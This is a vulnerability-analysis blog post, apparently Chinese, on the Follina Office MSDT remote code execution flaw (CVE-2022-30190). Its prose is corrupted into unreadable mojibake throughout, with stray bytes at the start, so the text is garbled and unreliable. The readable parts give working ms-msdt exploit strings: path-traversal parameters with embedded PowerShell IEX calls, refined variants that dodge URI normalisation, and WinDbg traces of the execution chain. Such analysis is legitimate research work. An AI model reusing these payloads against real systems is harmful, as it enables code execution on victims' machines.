I"šq<h1 id="å‰è¨€">å‰è¨€</h1>

<p>åœ¨åˆ†ææ¼æ´çš„è¿‡ç¨‹ä¸­ï¼Œé™†é™†ç»­ç»­çœ‹åˆ°è®¸å¤šå¸ˆå‚…çš„åˆ†ææ–‡ç« ï¼Œäºæ˜¯å‚è€ƒä¹‹åç»“åˆè‡ªå·±çš„åˆ†ææ€»ç»“äº†ä¸€ä¸‹ã€‚<!--more--></p>

<h1 id="æ¼æ´ç®€ä»‹">æ¼æ´ç®€ä»‹</h1>

<p>è¿‘æ—¥ï¼Œå¾®è½¯å®˜æ–¹ç½‘ç«™å‘å¸ƒäº†Microsoft Office MSDTï¼ˆMicrosoft Support Diagnostic Toolï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´é€šå‘Šï¼Œæ¼æ´ç¼–å·CVE-2022-30190ï¼Œç›®å‰åœ¨å¼€æºä»£ç å¹³å°å·²å­˜åœ¨è¯¥æ¼æ´çš„éªŒè¯ä»£ç ã€‚è¯¥é€šå‘ŠæŒ‡å‡ºï¼Œ<strong>Microsoft Office MSDTå­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨Officeæ–‡ä»¶ä¸­çš„è¿œç¨‹æ¨¡æ¿åŠŸèƒ½ï¼Œè®¿é—®è¿œç¨‹æœåŠ¡å™¨ä¸ŠæŒ‚è½½çš„æ¶æ„HTMLæ–‡ä»¶ï¼Œä¹‹åé€šè¿‡ â€˜ms-msdtâ€™ URIæ¥æ‰§è¡Œæ¶æ„PowerShellä»£ç </strong>ã€‚</p>

<p>å€¼å¾—æ³¨æ„çš„æ˜¯è¯¥æ¼æ´åœ¨å®è¢«ç¦ç”¨çš„æƒ…å†µä¸‹ä»å¯è¢«åˆ©ç”¨ã€‚<strong>å¹¶ä¸”å½“æ¶æ„æ–‡ä»¶å¦å­˜ä¸ºRTFæ ¼å¼æ—¶ï¼Œè¿˜å¯ä»¥é€šè¿‡Windowsèµ„æºç®¡ç†å™¨ä¸­çš„é¢„è§ˆçª—æ ¼è§¦å‘æ­¤æ¼æ´çš„è°ƒç”¨ï¼Œæ— éœ€æ‰§è¡Œä¹Ÿå¯ä»¥åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</strong>è¯¥æ¼æ´å½±å“èŒƒå›´éå¸¸å¹¿æ³›ï¼Œç›®å‰å®˜æ–¹æœªå‘å¸ƒä¿®å¤è¡¥ä¸ã€‚</p>

<h1 id="æ¼æ´åˆ©ç”¨é“¾">æ¼æ´åˆ©ç”¨é“¾</h1>

<h2 id="æ ·æœ¬æ‰§è¡Œæµç¨‹">æ ·æœ¬æ‰§è¡Œæµç¨‹</h2>

<p><strong>1. æ”»å‡»è€…åˆ©ç”¨Officeæ–‡ä»¶ä¸­çš„è¿œç¨‹æ¨¡æ¿åŠŸèƒ½åŠ è½½è¿œç¨‹çš„poc.html</strong></p>

<p>åœ¨document.xml.relsæ–‡ä»¶ä¸­å¯ä»¥çœ‹åˆ°docxæ–‡ä»¶åµŒå…¥äº†ä¸€ä¸ªoleå¯¹è±¡ï¼ŒæŒ‡å‘äº†poc.html</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-45-45.png" alt="Snipaste_2022-06-06_11-45-45" /></p>

<hr />

<p><strong>2.poc.htmlé€šè¿‡ â€˜ms-msdtâ€™ URLä½¿å¾—Officeæ‰§è¡Œmsdt.exeï¼Œå¹¶å°†æ„é€ å¥½çš„å‘½ä»¤è¡Œå‚æ•°ä¼ å…¥msdt.exe</strong></p>

<p>æŸ¥çœ‹poc.htmlçš„å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°é¡µé¢è®¿é—®äº†URLï¼š</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"
</code></pre></div></div>
<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-56-48.png" alt="Snipaste_2022-06-06_11-56-48" /></p>

<p>ä¸Šè¿°æ³¨é‡Šæ˜¯ä¸ºäº†å¡«å……HTMLé¡µé¢ä½¿å…¶å¤§å°å¤§äº4kbï¼Œåªæœ‰å¤§äº4kbçš„HTMLé¡µé¢wordæ‰ä¼šè§£æè¯¥é¡µé¢è¿›è€Œè§¦å‘æ¼æ´ï¼Œå…·ä½“åŸå› åœ¨<a href="https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/">Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit</a>è¿™ç¯‡æ–‡ç« ä¸­å·²ç»åˆ†æçš„å¾ˆæ¸…æ¥šäº†ã€‚</p>

<p>ä½¿ç”¨urlprotocolviewæŸ¥çœ‹<strong>ms-msdt</strong> URLå¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶æ­£æ˜¯msdt.exe</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-40-32.png" alt="Snipaste_2022-06-06_11-40-32" /></p>

<p>winword.exeè§£æè¯¥URLåä¼šè°ƒç”¨msdt.exeï¼Œå¹¶å°†å‘½ä»¤è¡Œå‚æ•°ä¼ å…¥</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_12-44-35.png" alt="Snipaste_2022-06-06_12-44-35" /></p>

<hr />

<p><strong>3.msdt.exeæ¥æ”¶å‘½ä»¤è¡Œå‚æ•°åè§¦å‘æ¼æ´æ‰§è¡Œpowershellå‘½ä»¤ï¼š<code class="language-plaintext highlighter-rouge">IEX('calc.exe')</code>ï¼Œè°ƒç”¨äº†calc.exe</strong></p>

<p>å› ä¸ºç›´æ¥æ‰“å¼€msdt.exeéœ€è¦è¾“å…¥æŠ€æœ¯æ”¯æŒäººå‘˜å¯†é’¥æ‰èƒ½è¿›è¡Œä¸‹ä¸€æ­¥è¯Šæ–­ï¼Œé€šè¿‡å‚æ•°<code class="language-plaintext highlighter-rouge">/id PCWDiagnostic</code>è¿è¡ŒPCWDiagnosticç¨‹åºå…¼å®¹æ€§è¯Šæ–­åŒ…ç»•è¿‡äº†è¯¥æ­¥éª¤</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_13-26-12.png" alt="Snipaste_2022-06-06_13-26-12" /></p>

<p>ç„¶è€Œåªæ˜¯ç»•è¿‡è¾“å…¥å¯†é’¥è¿˜ä¸å¤Ÿï¼Œè¿˜éœ€è¦ç‚¹å‡»ä¸‹ä¸€é¡µï¼Œæ‰å¯ä»¥æ¥æ”¶å‚æ•°æ‰§è¡Œè¿›ç¨‹ï¼Œé€šè¿‡å‚æ•°<code class="language-plaintext highlighter-rouge">/skip force </code>ç»•è¿‡äº†è¯¥æ­¥éª¤ï¼Œæ­¤æ—¶msdtä¼šåˆ›å»ºå¹¶å¯åŠ¨æœåŠ¡ï¼Œé€šè¿‡svchost.exeåˆ›å»ºè¿›ç¨‹sdiagnhost.exe</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_11-08-59.png" alt="Snipaste_2022-06-08_11-08-59" /></p>

<p>æ¥ç€å†è¾“å…¥<code class="language-plaintext highlighter-rouge">/param "IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"</code>å°±èƒ½é€šè¿‡sdiagnhost.exeæ‰§è¡Œpowershellå‘½ä»¤ï¼Œæ•´ä¸ªæ¼æ´åˆ©ç”¨å®Œæˆã€‚</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-52-02.png" alt="Snipaste_2022-06-08_09-52-02" /></p>

<p>æ•´ä¸ªæ¼æ´åˆ©ç”¨é“¾å¦‚å›¾æ‰€ç¤ºï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220815170312333.png" alt="image-20220815170312333" /></p>

<h2 id="æ¼æ´åˆ©ç”¨ç»†èŠ‚">æ¼æ´åˆ©ç”¨ç»†èŠ‚</h2>

<h3 id="wordè§£æurl">wordè§£æURL</h3>

<p>wordåœ¨è§£æms-msdt Office URLæ—¶æ˜¯é€šè¿‡mshtml.dllçš„ShellExecURLå‡½æ•°è§£æçš„ï¼Œè€Œè¯¥å‡½æ•°å†…éƒ¨ä¼šè°ƒç”¨ShellExecuteWæ‰§è¡Œå‘½ä»¤è¡Œå‚æ•°åˆ›å»ºmsdt.exe</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
rax=0000000000000000 rbx=0000000000000000 rcx=0000000000000000
rdx=0000000000000000 rsi=0000000080004005 rdi=00000267dfbe07f0
rip=00007ffa2fe2fe45 rsp=000000f644b0d410 rbp=000000f644b0d510
 r8=00000267dfb84838  r9=0000000000000000 r10=0000000000000000
r11=0000000000000246 r12=00007ffa3086e358 r13=0000000000000000
r14=0000000000000000 r15=0000000000000020
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
mshtml!ShellExecURL+0x24d:
00007ffa`2fe2fe45 48ff1554b8c600  call    qword ptr [mshtml!_imp_ShellExecuteW (00007ffa`30a9b6a0)] ds:00007ffa`30a9b6a0={mshtml!_imp_load_ShellExecuteW (00007ffa`2f8edaaa)}
0:000&gt; du r8		//ShellExecuteWçš„æ‰§è¡Œå‚æ•°
00000267`dfb84838  "ms-msdt:/id PCWDiagnostic /skip "
00000267`dfb84878  "force /param "IT_RebrowseForFile"
00000267`dfb848b8  "=cal?c IT_SelectProgram=NotListe"
00000267`dfb848f8  "d IT_BrowseForFile=h$(IEX('calc."
00000267`dfb84938  "exe'))i/../../../../../../../../"
00000267`dfb84978  "../../../../../../Windows/System"
00000267`dfb849b8  "32/mpsigstub.exe ""
0:000&gt; k			//å‡½æ•°è°ƒç”¨æ ˆ
 # Child-SP          RetAddr           Call Site
00 00000092`064fccc8 00007ffa`707502de SHELL32!ShellExecuteNormal
01 00000092`064fccd0 00007ffa`707d8f11 SHELL32!ShellExecuteExW+0xde
02 00000092`064fce70 00007ffa`2fe2fe4c SHELL32!ShellExecuteW+0x81
03 00000092`064fcf30 00007ffa`2fe2ee3a mshtml!ShellExecURL+0x254
04 00000092`064fd1f0 00007ffa`2fb4e721 mshtml!OpenInNewWindow+0x38e
05 00000092`064fd3e0 00007ffa`2f6206cf mshtml!CDoc::DoNavigate_NavigateInNewBrowser+0x201
06 00000092`064fd470 00007ffa`2f619f00 mshtml!CDoc::DoNavigate+0xbaf
07 00000092`064fd7c0 00007ffa`2f751420 mshtml!CDoc::FollowHyperlink2+0xc70
08 00000092`064fd9c0 00007ffa`2f75072b mshtml!CWindow::FollowHyperlinkHelper+0x2a4
09 00000092`064fdb40 00007ffa`2f74a704 mshtml!CWindow::NavigateEx+0xeb
0a 00000092`064fdcb0 000001c0`4fad4802 mshtml!COmLocationProxy::InvokeEx+0x4f4
0b 00000092`064fddc0 000001c0`4fad468e jscript9!HostDispatch::CallInvokeExInternal+0xf2
0c 00000092`064fde60 000001c0`4fad4540 jscript9!HostDispatch::CallInvokeHandler+0x96
0d 00000092`064fdee0 000001c0`4fb8afb6 jscript9!HostDispatch::CallInvokeEx+0x90
0e 00000092`064fdf70 000001c0`4fb8aed3 jscript9!HostDispatch::PutValueByDispId+0xd6
0f 00000092`064fe030 000001c0`4fa50ce1 jscript9!HostDispatch::PutValue+0x37
10 00000092`064fe070 000001c0`4fa54a1e jscript9!Js::JavascriptOperators::OP_SetProperty+0x1d1
11 00000092`064fe100 000001c0`4fa43f43 jscript9!Js::JavascriptOperators::PatchPutValueNoFastPath+0x7e
12 00000092`064fe180 000001c0`4fa47a2d jscript9!Js::InterpreterStackFrame::DoProfiledSetProperty&lt;Js::OpLayoutElementCP_OneByte const &gt;+0x183
13 00000092`064fe240 000001c0`4fa45029 jscript9!Js::InterpreterStackFrame::Process+0x6cd
14 00000092`064fe2c0 000001c0`4ff00fc3 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x4c9
15 00000092`064fe4d0 000001c0`4fb0afb6 0x000001c0`4ff00fc3
16 00000092`064fe500 000001c0`4f9eb3d1 jscript9!amd64_CallFunction+0x86
17 00000092`064fe550 000001c0`4fa9abc9 jscript9!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x71
18 00000092`064fe5c0 000001c0`4fa9aab0 jscript9!Js::JavascriptFunction::CallRootFunctionInternal+0xfd
19 00000092`064fe690 000001c0`4fa9aa0b jscript9!Js::JavascriptFunction::CallRootFunction+0x64
1a 00000092`064fe700 000001c0`4fa9a929 jscript9!ScriptSite::CallRootFunction+0x67
1b 00000092`064fe760 000001c0`4fa9ae80 jscript9!ScriptSite::Execute+0x109
1c 00000092`064fe7f0 000001c0`4fa20430 jscript9!ScriptEngine::ExecutePendingScripts+0x234
1d 00000092`064fe8e0 000001c0`4faf6924 jscript9!ScriptEngine::ParseScriptTextCore+0x49c
1e 00000092`064fea40 00007ffa`2f81e0c8 jscript9!ScriptEngine::ParseScriptText+0xc4
1f 00000092`064feaf0 00007ffa`2f5a25aa mshtml!CActiveScriptHolder::ParseScriptText+0xb8
20 00000092`064feb70 00007ffa`2f5a0f92 mshtml!CScriptCollection::ParseScriptText+0x25a
21 00000092`064fec50 00007ffa`2f5a09b6 mshtml!CScriptData::CommitCode+0x422
22 00000092`064fee20 00007ffa`2f5a072f mshtml!CScriptData::Execute+0x266
23 00000092`064feed0 00007ffa`2f63fa05 mshtml!CHtmScriptParseCtx::Execute+0xbf
24 00000092`064fef00 00007ffa`2f540767 mshtml!CHtmParseBase::Execute+0x95
25 00000092`064fef90 00007ffa`2f53ffaa mshtml!CHtmPost::Broadcast+0x47
26 00000092`064fefd0 00007ffa`2f80db06 mshtml!CHtmPost::Exec+0x29a
27 00000092`064ff1d0 00007ffa`2f80d9db mshtml!CHtmPost::Run+0x32
28 00000092`064ff200 00007ffa`2f80d96f mshtml!PostManExecute+0x63
29 00000092`064ff240 00007ffa`2f80d4d0 mshtml!PostManResume+0xab
2a 00000092`064ff280 00007ffa`2f875eec mshtml!CHtmPost::OnDwnChanCallback+0x40
2b 00000092`064ff2d0 00007ffa`2f53b0c1 mshtml!CDwnChan::OnMethodCall+0x1c
2c 00000092`064ff300 00007ffa`2f5dca04 mshtml!GlobalWndOnMethodCall+0x2b1
2d 00000092`064ff3b0 00007ffa`2f9854b8 mshtml!GlobalWndProc_SEH+0x104
2e 00000092`064ff440 00007ffa`6fd1e858 mshtml!GlobalWndProc+0x3a8c08
2f 00000092`064ff480 00007ffa`6fd1e299 USER32!UserCallWinProcCheckWow+0x2f8
30 00000092`064ff610 00007ffa`3e081af9 USER32!DispatchMessageWorker+0x249
31 00000092`064ff690 00007ffa`3dfe2009 wwlib!PTLS7::LsNotReached+0x7bd49
32 00000092`064ff730 00007ff6`79e71230 wwlib!FMain+0x61
33 00000092`064ff760 00007ff6`79e71519 winword+0x1230
34 00000092`064ff790 00007ffa`71177034 winword+0x1519
35 00000092`064ff7d0 00007ffa`71362651 KERNEL32!BaseThreadInitThunk+0x14
36 00000092`064ff800 00000000`00000000 ntdll!RtlUserThreadStart+0x21
</code></pre></div></div>

<p>ShellExecuteWå†…éƒ¨åˆ™æ˜¯é€šè¿‡CreateRemoteThreadExåˆ›å»ºæ–°çº¿ç¨‹ï¼Œé€šè¿‡æ–°çº¿ç¨‹åˆ›å»ºmsdt.exeï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:027&gt; r
rax=0000000002000000 rbx=0000000000000000 rcx=000000e48ad4d438
rdx=000000e48ad4d4a0 rsi=0000021054c22ee0 rdi=0000000000000000
rip=00007ffada60e620 rsp=000000e48ad4d358 rbp=000000e48ad4eb00
 r8=0000000002000000  r9=0000000002000000 r10=0000000000000000
r11=000000e48ad4d300 r12=0000000000000001 r13=0000000000000002
r14=0000000000000008 r15=0000000000000000
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!NtCreateUserProcess:
00007ffa`da60e620 4c8bd1          mov     r10,rcx
0:027&gt; dps poi(esp+98) La8/8			//AttributeList
000000e4`8ad4df00  00000000`000000a8
000000e4`8ad4df08  00000000`00020005	//PS_ATTRIBUTE_IMAGE_NAME
000000e4`8ad4df10  00000000`00000040	//NtImagePath.Length
000000e4`8ad4df18  00000210`54bae7b0	//NtImagePath.Buffer
000000e4`8ad4df20  00000000`00000000
000000e4`8ad4df28  00000000`00010003
000000e4`8ad4df30  00000000`00000010
000000e4`8ad4df38  000000e4`8ad4d7c0
000000e4`8ad4df40  00000000`00000000
000000e4`8ad4df48  00000000`00000006
000000e4`8ad4df50  00000000`00000040
000000e4`8ad4df58  000000e4`8ad4d900
000000e4`8ad4df60  00000000`00000000
000000e4`8ad4df68  00000000`00020009
000000e4`8ad4df70  00000000`00000004
000000e4`8ad4df78  000000e4`8ad4d6f0
000000e4`8ad4df80  00000000`00000000
000000e4`8ad4df88  00000000`0006001a
000000e4`8ad4df90  00000000`00000001
000000e4`8ad4df98  00000000`00000001
000000e4`8ad4dfa0  00000000`00000000
0:027&gt; du 00000210`54bae7b0				//åˆ›å»ºçš„è¿›ç¨‹å
00000210`54bae7b0  "\??\C:\Windows\system32\msdt.exe"
00000210`54bae7f0  ""
0:027&gt; k								//åˆ›å»ºmsdt.exeçš„çº¿ç¨‹è°ƒç”¨æ ˆ
 # Child-SP          RetAddr           Call Site
00 000000e4`8ad4d358 00007ffa`d8128e73 ntdll!NtCreateUserProcess
01 000000e4`8ad4d360 00007ffa`d81271a6 KERNELBASE!CreateProcessInternalW+0xfe3
02 000000e4`8ad4e930 00007ffa`d89dcbb4 KERNELBASE!CreateProcessW+0x66
03 000000e4`8ad4e9a0 00007ffa`d5f1152d KERNEL32!CreateProcessWStub+0x54
04 000000e4`8ad4ea00 00007ffa`d5ea6722 windows_storage!CInvokeCreateProcessVerb::CallCreateProcess+0x2cd
05 000000e4`8ad4ecb0 00007ffa`d5f0a75c windows_storage!CInvokeCreateProcessVerb::_PrepareAndCallCreateProcess+0x2d6
06 000000e4`8ad4ed30 00007ffa`d5f0a583 windows_storage!CInvokeCreateProcessVerb::_TryCreateProcess+0x3c
07 000000e4`8ad4ed60 00007ffa`d5f0a46d windows_storage!CInvokeCreateProcessVerb::Launch+0xef
08 000000e4`8ad4ee00 00007ffa`d5f49dc4 windows_storage!CInvokeCreateProcessVerb::Execute+0x5d
09 000000e4`8ad4ee40 00007ffa`d5e31d87 windows_storage!CBindAndInvokeStaticVerb::InitAndCallExecute+0x214
0a 000000e4`8ad4eec0 00007ffa`d5ea5787 windows_storage!CBindAndInvokeStaticVerb::TryCreateProcessDdeHandler+0x63
0b 000000e4`8ad4ef40 00007ffa`d5ef586d windows_storage!CBindAndInvokeStaticVerb::Execute+0x1e7
0c 000000e4`8ad4f260 00007ffa`d5ef5785 windows_storage!RegDataDrivenCommand::_TryInvokeAssociation+0xad
0d 000000e4`8ad4f2c0 00007ffa`d9b92b22 windows_storage!RegDataDrivenCommand::_Invoke+0x141
0e 000000e4`8ad4f330 00007ffa`d9b929da SHELL32!CRegistryVerbsContextMenu::_Execute+0xce
0f 000000e4`8ad4f3a0 00007ffa`d9b9630c SHELL32!CRegistryVerbsContextMenu::InvokeCommand+0xaa
10 000000e4`8ad4f6a0 00007ffa`d9b9618d SHELL32!HDXA_LetHandlerProcessCommandEx+0x10c
11 000000e4`8ad4f7b0 00007ffa`d9b926ab SHELL32!CDefFolderMenu::InvokeCommand+0x13d
12 000000e4`8ad4fb10 00007ffa`d9b92583 SHELL32!CShellExecute::_InvokeInProcExec+0xfb
13 000000e4`8ad4fc10 00007ffa`d9bcd671 SHELL32!CShellExecute::_InvokeCtxMenu+0x5b
14 000000e4`8ad4fc50 00007ffa`d9bac32d SHELL32!CShellExecute::_DoExecute+0x151
15 000000e4`8ad4fcc0 00007ffa`da48c3f9 SHELL32!&lt;lambda_519a2c088cd7d0cdfafe5aad47e70646&gt;::&lt;lambda_invoker_cdecl&gt;+0x2d
16 000000e4`8ad4fd30 00007ffa`d89d7034 SHCORE!_WrapperThreadProc+0xe9
17 000000e4`8ad4fe10 00007ffa`da5c2651 KERNEL32!BaseThreadInitThunk+0x14
18 000000e4`8ad4fe40 00000000`00000000 ntdll!RtlUserThreadStart+0x21
</code></pre></div></div>

<p>åˆ†æwordè§£æURLæ˜¯å› ä¸ºåœ¨å°è¯•ç¼©å‡payloadçš„è¿‡ç¨‹ä¸­å‘ç°äº†ç¼©å‡åçš„payloadèƒ½åœ¨cmdä¸ŠæˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯å†…åµŒåˆ°docxæ–‡æ¡£ä¸­åˆ™æ— æ³•æ‰§è¡Œï¼Œäºæ˜¯æ¢ç´¢äº†ä¸€ç•ªã€‚</p>

<h3 id="ä¸€äº›å°è¯•">ä¸€äº›å°è¯•</h3>

<p>åŸæœ¬çš„payloadå¯ä»¥ç›´æ¥åœ¨cmdä¸Šè¿è¡Œï¼Œå…¶ä¸­æœ‰äº›å‚æ•°æ˜¯ä¸å¿…è¦çš„ï¼Œæœ€ç»ˆç¼©å‡çš„payloadä¸º<code class="language-plaintext highlighter-rouge">msdt /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"</code>ï¼Œå°†payloadæ›¿æ¢åˆ°poc.htmlä¸­<code class="language-plaintext highlighter-rouge">window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../../$(calc).exe \" ";</code>ã€‚ç„¶è€Œè¯¥payloadå´æ— æ³•åœ¨wordä¸­æ‰§è¡ŒæˆåŠŸï¼ŒprocmonæŠ“åˆ°çš„å‚æ•°æ˜¯ä¸å®Œæ•´çš„ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-53-02.png" alt="Snipaste_2022-06-08_09-53-02" /></p>

<p>é‡æ–°è°ƒè¯•wordï¼Œæ–­åœ¨ShellExecURLï¼Œå‘ç°åˆ°è¯¥å‡½æ•°æ—¶å‘½ä»¤è¡Œçš„å‚æ•°å·²ç»å˜æˆ<code class="language-plaintext highlighter-rouge">ms-msdt:/id PCWDiagnostic /$(calc).exe</code>ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
rax=0000000000000000 rbx=0000000000000000 rcx=000002c0dc60fc00
rdx=000002c0cdec0000 rsi=000002c8e5144200 rdi=000002c8e5190400
rip=00007ffa9737fbf8 rsp=000000fbbf39d748 rbp=000000fbbf39d850
 r8=000002c0cde50d20  r9=0000000000000001 r10=0000000000008000
r11=000000fbbf39d5a0 r12=00007ffa97dbe358 r13=0000000000000000
r14=0000000000000000 r15=000002c0df5435d0
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
mshtml!ShellExecURL:
00007ffa`9737fbf8 488bc4          mov     rax,rsp
0:000&gt; du 000002c0df5438a0 
000002c0`df5438a0  "/id PCWDiagnostic /$(calc).exe""
</code></pre></div></div>

<p>å‘å‰å›æº¯åœ¨æ‰§è¡Œå‡½æ•°<code class="language-plaintext highlighter-rouge">iertutil!CreateUri</code>åï¼Œä¼ å…¥çš„å‚æ•°è¢«æˆªæ–­ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; r
rax=00000000000000dc rbx=000000000000006e rcx=000000b3c48fbe10
rdx=0000000003002b85 rsi=000001f1917fe9a8 rdi=0000000000000000
rip=00007ffa96d34a77 rsp=000000b3c48fbdb0 rbp=000000b3c48fbeb0
 r8=0000000000000000  r9=000000b3c48fbde8 r10=0000000000000000
r11=000000000000006e r12=000000b3c48fdeb0 r13=0000000000000000
r14=000000b3c48fdec8 r15=000000000000006e
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
mshtml!GetFullyExpandedUri+0x12b:
00007ffa`96d34a77 48ff1572c7f600  call    qword ptr [mshtml!_imp_CreateUri (00007ffa`97ca11f0)] ds:00007ffa`97ca11f0={iertutil!CreateUri (00007ffa`ce4ffa10)}
0:000&gt; du rcx											//ä¼ å…¥çš„å‚æ•°
000000b3`c48fbe10  "ms-msdt:/id PCWDiagnostic /skip "
000000b3`c48fbe50  "force /param "IT_LaunchMethod=Co"
000000b3`c48fbe90  "ntextMenu IT_BrowseForFile=/../."
000000b3`c48fbed0  "./$(calc).exe""
0:000&gt; dps r9 L1										//ä¼ å‡ºçš„IUriç»“æ„æŒ‡é’ˆ
000000b3`c48fbde8  00000000`00000000
0:000&gt; p
mshtml!GetFullyExpandedUri+0x132:
00007ffa`96d34a7e 0f1f440000      nop     dword ptr [rax+rax]
0:000&gt; du poi(poi(000000b3`c48fbde8)+68)				//æ‰§è¡Œå®Œå‡½æ•°åè¿”å›çš„IUriç»“æ„æ‰€æŒ‡çš„URIå­—ç¬¦ä¸²
000001f1`8a2bc560  "/id PCWDiagnostic /$(calc).exe""
</code></pre></div></div>

<p>æ­¤æ—¶æŸ¥çœ‹MSDNå¯¹äº<a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775098(v=vs.85)">CreateUri</a>å‡½æ•°çš„è¯´æ˜ï¼Œå‘ç°å¯¹äºä¼ å…¥çš„URIä¼šè¿›è¡Œè§„èŒƒåŒ–ï¼Œä¼šåˆ é™¤ç›¸å¯¹è·¯å¾„æ®µâ€./â€å’Œâ€../â€ï¼Œå¹¶é…Œæƒ…ç¼©çŸ­è·¯å¾„ï¼Œå› æ­¤åŸæœ¬çš„å‚æ•°ä¼šè¢«æˆªæ–­ã€‚</p>

<p>ä½†æ˜¯åŸpayloadä¸­çš„â€./â€å’Œâ€../â€è¢«ä¿ç•™ä¸‹æ¥äº†ï¼Œåˆ†æåå¾—çŸ¥åœ¨å¦‚æœå‚æ•°ä¸­æœ‰â€?â€ç¬¦å·ï¼Œåˆ™åé¢çš„å†…å®¹ä¸ä¼šè¢«æˆªæ–­ï¼Œäºæ˜¯é‡æ–°ç¼–å†™payload<code class="language-plaintext highlighter-rouge">window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_ReBrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"";</code>èƒ½æˆåŠŸæ‰§è¡Œï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_09-53-33.png" alt="Snipaste_2022-06-08_09-53-33" /></p>

<h1 id="æ¼æ´åŸç†åˆ†æ">æ¼æ´åŸç†åˆ†æ</h1>

<h2 id="windows-troubleshooting-platformwtpç®€ä»‹">Windows Troubleshooting Platformï¼ˆWTPï¼‰ç®€ä»‹</h2>

<h3 id="wtpæ¶æ„">WTPæ¶æ„</h3>

<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/wintt/about-wtp">WTP</a>ç”±ä¸€ä¸ª Windows æ•…éšœæ’é™¤è¿è¡Œå¼•æ“ã€ç»“æœæŠ¥å‘Šå’Œè°ƒè¯•æŠ¥å‘Šã€å››ä¸ªæ•…éšœæ’é™¤ cmdlet å’Œä¸€ä¸ªæ‰˜ç®¡çš„ Windows PowerShell è¿è¡Œç¯å¢ƒç»„æˆï¼Œä¸åŒçš„Windowsæ•…éšœæ’é™¤åŒ…ä¼šè°ƒç”¨ä¸åŒPowerShell Scriptï¼Œå¹¶è¾“å‡ºå¯¹åº”çš„ç»“æœæŠ¥å‘Šå’Œè°ƒè¯•æŠ¥å‘Šã€‚ä¸‹å›¾æ˜¾ç¤ºäº† WTP æ¶æ„ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/architecture.png" alt="architecture" /></p>

<p>Windwosæ•…éšœæ’é™¤åŒ…æ—¢å¯ä»¥é€šè¿‡WTP å‘å¯¼ (MSDT.exe) è¿è¡Œï¼ˆæœ¬æ¬¡æ¼æ´å°±æ˜¯é€šè¿‡è¿™ç§æ–¹å¼ï¼‰ï¼Œåˆå¯ä»¥åœ¨Windows PowerShell çª—å£ä¸­è¿è¡Œï¼Œé€šè¿‡Windows PowerShell çª—å£è¿è¡Œæ•…éšœæ’é™¤åŒ…æ—¶msdt.exeä¸ä¼šå¯åŠ¨ï¼š</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_11-15-57.png" alt="Snipaste_2022-06-08_11-15-57" /></p>

<h3 id="æ•…éšœæ’é™¤åŒ…troubleshooting-packçš„ç»„ä»¶">æ•…éšœæ’é™¤åŒ…ï¼ˆTroubleshooting Packï¼‰çš„ç»„ä»¶</h3>

<p>ä¸‹å›¾æ˜¾ç¤ºäº†æ•…éšœæ’é™¤åŒ…ä¸­åŒ…å«çš„ç»„ä»¶ï¼š</p>

